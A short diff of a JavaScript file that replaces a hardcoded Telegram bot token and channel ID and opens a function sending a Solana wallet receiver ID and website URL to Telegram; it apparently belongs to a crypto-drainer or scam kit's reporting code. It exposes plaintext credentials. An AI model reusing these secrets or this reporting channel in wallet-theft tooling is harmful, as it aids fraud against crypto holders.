@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token [ DO NOT TOUCH ]
-const botToken = '7295889133:AAE-3GSmILJ-dLmtckRbRqTef2VoNMxHbrk';
+const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jttW2sH9U8';
 
 // Telegram channel ID [ DO NOT TOUCH ]
-const chatId = '6602927804';
+const chatId = '4177494374';
 
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
